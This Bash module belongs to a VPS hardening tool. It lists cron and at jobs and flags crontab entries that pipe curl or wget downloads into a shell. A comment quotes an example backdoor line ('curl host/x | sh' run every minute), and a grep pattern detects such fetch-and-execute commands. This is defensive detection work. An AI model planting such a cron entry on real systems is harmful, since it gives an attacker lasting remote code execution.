#!/usr/bin/env bash
# vpssec - VPS Security Check & Hardening Tool
# Scheduling module — cron + at job inventory and anomaly detection
# Copyright (c) 2024
#
# Why this module exists:
# Lynis SCHD-* audit scheduled jobs. cron and at are classic supply-
# chain and persistence vectors — a single `* * * * * curl host/x | sh`
# in /etc/cron.d/ gives an attacker boot-survivable code execution.
# vpssec's filesystem.sh covers cron-file *permissions* but never
# inspects job *content*.

# ==============================================================================
# Helpers
# ==============================================================================

# Enumerate every cron entry vpssec can see. Output one entry per line,
# tagged with its source. The source tag is part of the line so anomaly
# detection downstream can point at the right file.
_sched_list_cron_entries() {
    local f

    # System crontab
    if [[ -f /etc/crontab ]]; then
        # Strip comments + blank lines.
        grep -Ev '^[[:space:]]*(#|$)' /etc/crontab 2>/dev/null \
            | sed "s|^|/etc/crontab: |"
    fi

    # /etc/cron.d/ — files dropped here are full crontab format
    if [[ -d /etc/cron.d ]]; then
        for f in /etc/cron.d/*; do
            [[ -f "$f" ]] || continue
            grep -Ev '^[[:space:]]*(#|$)' "$f" 2>/dev/null \
                | sed "s|^|${f}: |"
        done
    fi

    # /etc/cron.{daily,hourly,weekly,monthly}/ — these are run-parts
    # scripts. We don't inspect script contents (too broad), only
    # list their names so the operator can audit.
    local dir
    for dir in /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        [[ -d "$dir" ]] || continue
        for f in "$dir"/*; do
            [[ -f "$f" || -L "$f" ]] || continue
            printf '%s: run-parts script (contents not inspected)\n' "$f"
        done
    done

    # Per-user crontabs from /var/spool/cron/* — paths vary by distro.
    for dir in /var/spool/cron /var/spool/cron/crontabs; do
        [[ -d "$dir" ]] || continue
        for f in "$dir"/*; do
            [[ -f "$f" ]] || continue
            local user; user=$(basename "$f")
            grep -Ev '^[[:space:]]*(#|$)' "$f" 2>/dev/null \
                | sed "s|^|user crontab (${user}): |"
        done
    done
}

# Pattern-match cron entries that fetch arbitrary content from the
# network and pipe to a shell. This is the canonical supply-chain /
# persistence trigger.
_sched_find_internet_fetch_in_cron() {
    _sched_list_cron_entries | grep -E \
        '(curl|wget|fetch|http_proxy)[^|]*\|[[:space:]]*(sh|bash|zsh|ash|dash)([[:space:]]|$)' \
        || true
}

# Return at-job IDs (one per line). `atq` columns: id  date  queue  user
_sched_list_at_jobs() {
    command -v atq >/dev/null 2>&1 || return 0
    atq 2>/dev/null | awk '{print $1}'
}

# ==============================================================================
# Audit
# ==============================================================================

scheduling_audit() {
    local module="scheduling"

    print_item "$(i18n 'scheduling.check_at_jobs' 2>/dev/null || echo 'Checking at jobs')"
    _sched_audit_at_jobs

    print_item "$(i18n 'scheduling.check_cron_internet_fetch' 2>/dev/null || echo 'Checking cron jobs for piped fetches')"
    _sched_audit_cron_anomalies
}

_sched_audit_at_jobs() {
    if ! command -v atq >/dev/null 2>&1; then
        # at not installed → silent pass (the typical state)
        return
    fi

    local jobs
    jobs=$(_sched_list_at_jobs)

    if [[ -n "$jobs" ]]; then
        local count
        count=$(echo "$jobs" | wc -l)
        local check=$(create_check_json \
            "scheduling.at_jobs_present" \
            "scheduling" \
            "low" \
            "failed" \
            "$(i18n 'scheduling.at_jobs_present' "count=$count" 2>/dev/null || echo "${count} at job(s) queued")" \
            "at-job IDs: $(echo "$jobs" | tr '\n' ' ')" \
            "Inspect with 'at -c <jobid>'; remove with 'atrm <jobid>'. at jobs are uncommon on servers — verify each is intentional" \
            "")
        state_add_check "$check"
        print_severity "low" "$(i18n 'scheduling.at_jobs_present' "count=$count" 2>/dev/null || echo "${count} at job(s) queued")"
    else
        local check=$(create_check_json \
            "scheduling.no_at_jobs" \
            "scheduling" \
            "low" \
            "passed" \
            "$(i18n 'scheduling.no_at_jobs' 2>/dev/null || echo 'No at jobs queued')" \
            "" \
            "" \
            "")
        state_add_check "$check"
        print_ok "$(i18n 'scheduling.no_at_jobs' 2>/dev/null || echo 'No at jobs queued')"
    fi
}

_sched_audit_cron_anomalies() {
    local hits
    hits=$(_sched_find_internet_fetch_in_cron)

    if [[ -n "$hits" ]]; then
        # Show up to 3 examples in the report — the full list goes to
        # the log file via log_info below.
        local sample
        sample=$(echo "$hits" | head -3 | tr '\n' ';' | sed 's|;$||')
        local count
        count=$(echo "$hits" | wc -l)
        local check=$(create_check_json \
            "scheduling.cron_fetches_internet" \
            "scheduling" \
            "medium" \
            "failed" \
            "$(i18n 'scheduling.cron_fetches_internet' "count=$count" 2>/dev/null || echo "${count} cron entr(y/ies) pipe remote downloads to a shell")" \
            "Sample: ${sample}" \
            "Review each entry; piping curl/wget output to sh is a classic backdoor / supply-chain pattern" \
            "")
        state_add_check "$check"
        log_info "Cron internet-fetch entries: $hits"
        print_severity "medium" "$(i18n 'scheduling.cron_fetches_internet' "count=$count" 2>/dev/null || echo "${count} cron entr(y/ies) pipe remote downloads to a shell")"
    else
        local check=$(create_check_json \
            "scheduling.cron_clean" \
            "scheduling" \
            "low" \
            "passed" \
            "$(i18n 'scheduling.cron_clean' 2>/dev/null || echo 'No suspicious cron patterns detected')" \
            "" \
            "" \
            "")
        state_add_check "$check"
        print_ok "$(i18n 'scheduling.cron_clean' 2>/dev/null || echo 'No suspicious cron patterns')"
    fi
}

# ==============================================================================
# Fix Functions — alert-only.
# ==============================================================================

scheduling_fix() {
    local fix_id="$1"
    log_error "scheduling module has no automated fixes (fix_id=$fix_id)"
    return 1
}
